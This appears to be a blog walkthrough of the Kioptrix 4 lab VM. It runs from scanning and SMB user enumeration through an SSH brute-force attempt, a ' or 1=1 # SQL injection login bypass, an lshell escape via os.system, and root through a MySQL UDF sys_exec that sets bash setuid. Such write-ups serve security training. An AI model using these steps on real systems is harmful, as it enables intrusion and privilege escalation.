<i>Kioptrix 4 VM can be downloaded <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/" target="_blank">here</a>. </i><br /><h2>0. Get VMs IP</h2><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@kali:~#</span> netdiscover -r 192.168.1.0/24<br /><br /><span style="color: black; font-style: italic;"> Currently scanning: Finished!   |   Screen View: Unique Hosts</span><br /><br /><span style="color: black; font-style: italic;"> 271 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 900</span><br /><span style="color: black; font-style: italic;"> _____________________________________________________________________________</span><br /><span style="color: black; font-style: italic;">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname&nbsp;</span></pre><pre style="line-height: 125%; margin: 0;"><span style="color: black; font-style: italic;">&nbsp;</span><span style="color: black; font-style: italic;">-----------------------------------------------------------------------------</span>&nbsp;</pre><pre style="line-height: 125%; margin: 0;"> <i>192.168.1.69    08:00:27:a9:14:f5      1      60  PCS Systemtechnik GmbH</i>    </pre><pre style="line-height: 125%; margin: 0;"> <b>...</b> </pre></div><h2>1. Enumeration&nbsp;</h2><h4>TCP Ports enumeration</h4><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@kali:~#</span> nmap -sV 192.168.1.69<br /><br /><span style="color: black; font-style: italic;">Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-28 15:46 EST<br />Nmap scan report for 192.168.1.69<br />Host is up (0.000077s latency).<br />Not shown: 566 closed ports, 430 filtered ports<br />PORT    STATE SERVICE     VERSION<br /><b>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)<br />80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)<br />139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</b><br />MAC Address: 08:00:27:A9:14:F5 (Oracle VirtualBox virtual NIC)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 30.06 seconds</span><br /></pre></div><br />Full TCP scan yields the same results.<br /><h2>2. SMB enumeration</h2>enum4linux is the tool to go for enumerating these services, you might need to use other ones line smbwalk or nmap scripts.<br /><br />The output showed many unwanted information but the following info interests us:<br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@kali:~#</span> enum4linux 192.168.1.69</pre><pre style="line-height: 125%; margin: 0;">...</pre><pre style="line-height: 125%; margin: 0;"> ====================================== <br />|    OS information on 192.168.1.69    |<br /> ====================================== <br />[+] Got OS info for 192.168.1.69 from smbclient: Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.28a]<br />[+] Got OS info for 192.168.1.69 from srvinfo:<br /> KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)<br /> platform_id     : 500<br /> os version      : 4.9<br /> server type     : 0x809a03<br /><br /> ============================= <br />|    Users on 192.168.1.69    |<br /> ============================= <br />index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody Name: nobody Desc: (null)<br />index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert Name: ,,, Desc: (null)<br />index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root Name: root Desc: (null)<br />index: 0x4 RID: 0xbba acb: 0x00000010 Account: john Name: ,,, Desc: (null)<br />index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret Name: loneferret,,, Desc: (null)<br /></pre><pre style="line-height: 125%; margin: 0;">...</pre></div><br /><ul><li><b>SMB version:</b> Samba 3.0.28a (Unfortunately none of the public exploits for this version worked).</li><li><b>Users found:</b> robert, root, john and loneferret.</li></ul>&nbsp;Let's first bruteforce SSH for the 4 users we found using hydra.<br /><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:~#</span> hydra -L users -P 10_million_password_list_top_1000.txt -t 4 192.168.1.69 ssh -vv<br /><span style="color: #aaaaaa;">Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.<br /><br />Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-28 16:01:57<br />[DATA] max 4 tasks per 1 server, overall 64 tasks, 4000 login tries (l:4/p:1000), ~15 tries per task<br />[DATA] attacking service ssh on port 22<br />[VERBOSE] Resolving addresses ... [VERBOSE] resolving done<br />[INFO] Testing if password authentication is supported by ssh://192.168.1.69:22<br />[INFO] Successful, password authentication is supported by ssh://192.168.1.69:22</span><br /></pre></div><br /><i>Just FYI, hydra won't find any passwords.</i><br /><h2>&nbsp;3. Web server</h2><br /><table align="center" bgcolor="#CCCCCC" border="0" cellpadding="0" cellspacing="1" style="width: 300px;"><tbody><tr><td><table bgcolor="#FFFFFF" border="0" cellpadding="3" cellspacing="1" style="width: 100%px;"><tbody><tr>      <td align="center" colspan="3"><b>Member Login </b></td>     </tr><tr>      <td width="78">Username</td>      <td width="6">:</td>      <td align="right" width="194"><input id="myusername" name="myusername" type="text" />      </td>     </tr><tr>      <td>Password</td>      <td>:</td>      <td align="right"><input id="mypassword" name="mypassword" type="password" />      </td>     </tr><tr>      <td></td>      <td></td>      <td align="right"><input name="Submit" type="submit" value="Login" /></td>     </tr><tr>      <td align="center" colspan="3" width="300"><image src="http://i.imgur.com/ew2H6U9.png">      <!-- Image from http://www.wpclipart.com-->      </image></td>     </tr><tr>      <td align="center" colspan="3" width="300"><span style="font-size: xx-small;">LigGoat secure Login Copyright (c) 2013</span>      </td>     </tr></tbody></table></td>   </tr></tbody></table><br /><br />Hmm, nikto didn't reveal anything interesting. I ran dirb which found a hidden directory "john", john.php redirected to the login page. <br /><br />I used <a href="https://github.com/maurosoria/dirsearch">dirsearch </a>with a bigger wordlist and revealed <b>database.sql.</b><br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #006699; font-weight: bold;">CREATE</span> <span style="color: #006699; font-weight: bold;">TABLE</span> <span style="color: #555555;">`</span>members<span style="color: #555555;">`</span> (<br /><span style="color: #555555;">`</span>id<span style="color: #555555;">`</span> <span style="color: #336666;">int</span>(<span style="color: #ff6600;">4</span>) <span style="color: #006699; font-weight: bold;">NOT</span> <span style="color: #006699; font-weight: bold;">NULL</span> auto_increment,<br /><span style="color: #555555;">`</span>username<span style="color: #555555;">`</span> <span style="color: #336666;">varchar</span>(<span style="color: #ff6600;">65</span>) <span style="color: #006699; font-weight: bold;">NOT</span> <span style="color: #006699; font-weight: bold;">NULL</span> <span style="color: #006699; font-weight: bold;">default</span> <span style="color: #cc3300;">''</span>,<br /><span style="color: #555555;">`</span>password<span style="color: #555555;">`</span> <span style="color: #336666;">varchar</span>(<span style="color: #ff6600;">65</span>) <span style="color: #006699; font-weight: bold;">NOT</span> <span style="color: #006699; font-weight: bold;">NULL</span> <span style="color: #006699; font-weight: bold;">default</span> <span style="color: #cc3300;">''</span>,<br /><span style="color: #006699; font-weight: bold;">PRIMARY</span> <span style="color: #006699; font-weight: bold;">KEY</span> (<span style="color: #555555;">`</span>id<span style="color: #555555;">`</span>)<br />) <span style="color: #006699; font-weight: bold;">TYPE</span><span style="color: #555555;">=</span>MyISAM AUTO_INCREMENT<span style="color: #555555;">=</span><span style="color: #ff6600;">2</span> ;<br /><br /><span style="color: #0099ff; font-style: italic;">-- </span><br /><span style="color: #0099ff; font-style: italic;">-- Dumping data for table `members`</span><br /><span style="color: #0099ff; font-style: italic;">-- </span><br /><br /><span style="color: #006699; font-weight: bold;">INSERT</span> <span style="color: #006699; font-weight: bold;">INTO</span> <span style="color: #555555;">`</span>members<span style="color: #555555;">`</span> <span style="color: #006699; font-weight: bold;">VALUES</span> (<span style="color: #ff6600;">1</span>, <span style="color: #cc3300;">'john'</span>, <span style="color: #cc3300;">'1234'</span>);<br /></pre></div><br />Unfortunately these logins didn't work either. Guess the login is vulnerable to SQL injection, and we know already it's a MySQL DB we're dealing with.<br /><br />I tried the following combinations:<br /><br /><b>Username:</b> john<br /><b>Password:</b> ' or 1=1 #<br /><b>Output:</b><br /><br />Something went wrong <br /><table align="center" bgcolor="#CCCCCC" border="0" cellpadding="0" cellspacing="1" style="width: 500px;"><tbody><tr>                <td><table bgcolor="#FFFFFF" border="0" cellpadding="3" cellspacing="1" style="width: 100%px;"><tbody><tr>                                        <td align="center" colspan="3"><b>Member's Control Panel </b></td>                                </tr><tr>                                        <td width="30">Username</td>                                        <td width="6">:</td>     <td width="464"></td>                                </tr><tr>                                        <td width="30">Password</td>                                        <td width="6">:</td>     <td width="464"></td>                                </tr><tr>                                        <td>&nbsp;      <br /><form action="logout.php" method="link"><input type="submit" value="Logout" />     </form></td>                                        <td></td>                                </tr></tbody></table></td>        </tr></tbody></table><b>Username:</b> robert<br /><b>Password:</b> ' or 1=1 #<br /><b>Output:</b><br /><br /><table align="center" bgcolor="#CCCCCC" border="0" cellpadding="0" cellspacing="1" style="width: 500px;">        <tbody><tr>                <td><table bgcolor="#FFFFFF" border="0" cellpadding="3" cellspacing="1" style="width: 100%px;">                                <tbody><tr>                                        <td align="center" colspan="3"><b>Member's Control Panel </b></td>                                </tr><tr>                                        <td width="30">Username</td>                                        <td width="6">:</td>     <td width="464">robert</td>                                </tr><tr>                                        <td width="30">Password</td>                                        <td width="6">:</td>     <td width="464">ADGAdsafdfwt4gadfga==</td>                                </tr><tr>                                        <td>&nbsp;      <br /><form action="logout.php" method="link"><input type="submit" value="Logout" />     </form></td>                                        <td></td>                                </tr></tbody></table></td>        </tr></tbody></table>We found the credentials for robert! Although it might look like a base64 encoded string, it isn't. You can use those credentials directly to SSH.<br /><br /><h2>4. Escaping restricted (s)hell</h2><!-- HTML generated using hilite.me --><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:~/Desktop/dirsearch#</span> ssh robert@192.168.1.69<br /><span style="color: #aaaaaa;">robert@192.168.1.69's password: </span><br /><span style="color: #aaaaaa;">Welcome to LigGoat Security Systems - We are Watching</span><br /><span style="color: #aaaaaa;">== Welcome LigGoat Employee ==</span><br /><span style="color: #aaaaaa;">LigGoat Shell is in place so you  don't screw up</span><br /><span style="color: #aaaaaa;">Type '?' or 'help' to get the list of allowed commands</span><br /><span style="color: #000099; font-weight: bold;">robert:~$</span> ?<br /><span style="color: #aaaaaa;">cd  clear  echo  exit  help  ll  lpath  ls</span><br /><span style="color: #000099; font-weight: bold;">robert:~$</span> ls<br /><span style="color: #000099; font-weight: bold;">robert:~$</span> ls -al<br /><span style="color: #aaaaaa;">total 24</span><br /><span style="color: #aaaaaa;">drwxr-xr-x 2 robert robert 4096 2012-02-04 18:53 .</span><br /><span style="color: #aaaaaa;">drwxr-xr-x 5 root   root   4096 2012-02-04 18:05 ..</span><br /><span style="color: #aaaaaa;">-rw-r--r-- 1 robert robert  220 2012-02-04 18:05 .bash_logout</span><br /><span style="color: #aaaaaa;">-rw-r--r-- 1 robert robert 2940 2012-02-04 18:05 .bashrc</span><br /><span style="color: #aaaaaa;">-rw-r--r-- 1 robert robert    5 2012-02-04 18:59 .lhistory</span><br /><span style="color: #aaaaaa;">-rw-r--r-- 1 robert robert  586 2012-02-04 18:05 .profile</span><br /><span style="color: #000099; font-weight: bold;">robert:~$</span> <span style="color: #336666;">echo </span>os.system<span style="color: #555555;">(</span><span style="color: #cc3300;">"/bin/bash"</span><span style="color: #555555;">)</span><br /><span style="color: #000099; font-weight: bold;">robert@Kioptrix4:~$</span> <br /></pre></div><br /><h2>5. Getting root<i> </i></h2>We already know there's a MySQL database running, I navigated to /var/www to check the php files.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">robert@Kioptrix4:/var/www$</span> cat checklogin.php <br /><span style="color: #aaaaaa;">&lt;?php</span><br /><span style="color: #aaaaaa;">ob_start();</span><br /><span style="color: #000099; font-weight: bold;">$</span><span style="color: #003333;">host</span><span style="color: #555555;">=</span><span style="color: #cc3300;">"localhost"</span>; // Host name<br /><span style="color: #000099; font-weight: bold;">$</span><span style="color: #003333;">username</span><span style="color: #555555;">=</span><span style="color: #cc3300;">"root"</span>; // Mysql username<br /><span style="color: #000099; font-weight: bold;">$</span><span style="color: #003333;">password</span><span style="color: #555555;">=</span><span style="color: #cc3300;">""</span>; // Mysql password<br /><span style="color: #000099; font-weight: bold;">$</span><span style="color: #003333;">db_name</span><span style="color: #555555;">=</span><span style="color: #cc3300;">"members"</span>; // Database name<br /><span style="color: #000099; font-weight: bold;">$</span><span style="color: #003333;">tbl_name</span><span style="color: #555555;">=</span><span style="color: #cc3300;">"members"</span>; // Table name<br /></pre></div><br />Nice! Username is root with no password.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">robert@Kioptrix4:/var/www$</span> mysql -u root -p<br /><span style="color: #aaaaaa;">Enter password: </span><br /><span style="color: #aaaaaa;">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br /><span style="color: #aaaaaa;">Your MySQL connection id is 41</span><br /><span style="color: #aaaaaa;">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br /><br /><span style="color: #aaaaaa;">Type 'help;' or '\h' for help. Type '\c' to clear the buffer.</span><br /><br /><span style="color: #aaaaaa;">mysql&gt; show databases;</span><br /><span style="color: #aaaaaa;">+--------------------+</span><br /><span style="color: #aaaaaa;">| Database           |</span><br /><span style="color: #aaaaaa;">+--------------------+</span><br /><span style="color: #aaaaaa;">| information_schema | </span><br /><span style="color: #aaaaaa;">| members            | </span><br /><span style="color: #aaaaaa;">| mysql              | </span><br /><span style="color: #aaaaaa;">+--------------------+</span><br /><span style="color: #aaaaaa;">3 rows in set (0.00 sec)</span><br /><br /><span style="color: #aaaaaa;">mysql&gt; use members;</span><br /><span style="color: #aaaaaa;">Reading table information for completion of table and column names</span><br /><span style="color: #aaaaaa;">You can turn off this feature to get a quicker startup with -A</span><br /><br /><span style="color: #aaaaaa;">Database changed</span><br /><span style="color: #aaaaaa;">mysql&gt; show tables;</span><br /><span style="color: #aaaaaa;">+-------------------+</span><br /><span style="color: #aaaaaa;">| Tables_in_members |</span><br /><span style="color: #aaaaaa;">+-------------------+</span><br /><span style="color: #aaaaaa;">| members           | </span><br /><span style="color: #aaaaaa;">+-------------------+</span><br /><span style="color: #aaaaaa;">1 row in set (0.00 sec)</span><br /><br /><span style="color: #aaaaaa;">mysql&gt; select * from members;</span><br /><span style="color: #aaaaaa;">+----+----------+-----------------------+</span><br /><span style="color: #aaaaaa;">| id | username | password              |</span><br /><span style="color: #aaaaaa;">+----+----------+-----------------------+</span><br /><span style="color: #aaaaaa;">|  1 | john     | MyNameIsJohn          | </span><br /><span style="color: #aaaaaa;">|  2 | robert   | ADGAdsafdfwt4gadfga== | </span><br /><span style="color: #aaaaaa;">+----+----------+-----------------------+</span><br /><span style="color: #aaaaaa;">2 rows in set (0.00 sec)</span><br /></pre></div><br />We found john's credentials, but we still want to get root.<br /><br />After a whole lot of enumeration I discovered that mysql service is running as root. Then I followed <a href="https://www.iodigitalsec.com/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/">this wonderful guide</a>.<br /><br />Extremely well written, made it a piece of cake to get root. Surprisingly too, the required file <b>lib_mysqludf_sys.so </b>already existed on the system.<br /><br /><b></b><!-- HTML generated using hilite.me --><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">mysql<span style="color: #555555;">&gt;</span> <span style="color: #006699; font-weight: bold;">use</span> mysql;<br />mysql<span style="color: #555555;">&gt;</span> <span style="color: #006699; font-weight: bold;">create</span> function sys_exec returns <span style="color: #007788; font-weight: bold;">integer</span> <span style="color: #006699; font-weight: bold;">soname</span> <span style="color: #cc3300;">'lib_mysqludf_sys.so'</span>;<br />mysql<span style="color: #555555;">&gt;</span> <span style="color: #006699; font-weight: bold;">select</span> <span style="color: #cc00ff;">sys_exec</span>(<span style="color: #cc3300;">'chmod u+s /bin/bash'</span>);<br /></pre></div><br /><!-- HTML generated using hilite.me -->Did we get root?<br /><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">bash-3.2<span style="color: #003333;">$ </span>ls -a /bin/bash<br />/bin/bash<br />bash-3.2<span style="color: #003333;">$ </span>ls -l /bin/bash<br />-rwsr-xr-x 1 root root 702160 2008-05-12 14:33 /bin/bash<br />bash-3.2<span style="color: #003333;">$ </span>bash -p<br />bash-3.2# whoami<br />root<br /></pre></div><br />We're done! Let's check our flag. <br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">bash-3.2# cd /root<br />bash-3.2# ls -al<br />total 44<br />drwxr-xr-x  4 root       root       4096 2012-02-06 18:46 .<br />drwxr-xr-x 21 root       root       4096 2012-02-06 18:41 ..<br />-rw-------  1 root       root         59 2012-02-06 20:24 .bash_history<br />-rw-r--r--  1 root       root       2227 2007-10-20 07:51 .bashrc<br />-rw-r--r--  1 root       root        625 2012-02-06 10:48 congrats.txt<br />-rw-r--r--  1 root       root          1 2012-02-05 10:38 .lhistory<br />drwxr-xr-x  8 loneferret loneferret 4096 2012-02-04 17:01 lshell-0.9.12<br />-rw-------  1 root       root          1 2012-02-05 10:38 .mysql_history<br />-rw-------  1 root       root          5 2012-02-06 18:38 .nano_history<br />-rw-r--r--  1 root       root        141 2007-10-20 07:51 .profile<br />drwx------  2 root       root       4096 2012-02-06 11:43 .ssh<br />bash-3.2# cat congrats.txt <br />Congratulations!<br />You've got root.<br /><br />There is more then one way to get root on this system. Try and find them.<br />I've only tested two (2) methods, but it doesn't mean there aren't more.<br />As always there's an easy way, and a not so easy way to pop this box.<br />Look for other methods to get root privileges other than running an exploit.<br /><br />It took a while to make this. For one it's not as easy as it may look, and<br />also work and family life are my priorities. Hobbies are low on my list.<br />Really hope you enjoyed this one.<br /><br />If you haven't already, check out the other VMs available on:<br />www.kioptrix.com<br /><br />Thanks for playing,<br />loneferret<br /><br />bash-3.2# <br /></pre></div><br />This is the hardest one in the series so far, took me a bit too long to figure out the privilege escalation part. <br /> <i>Currently listening to <a href="https://www.youtube.com/watch?v=A3tA0mjP2cE">Nightwish - Dead Gardens</a></i>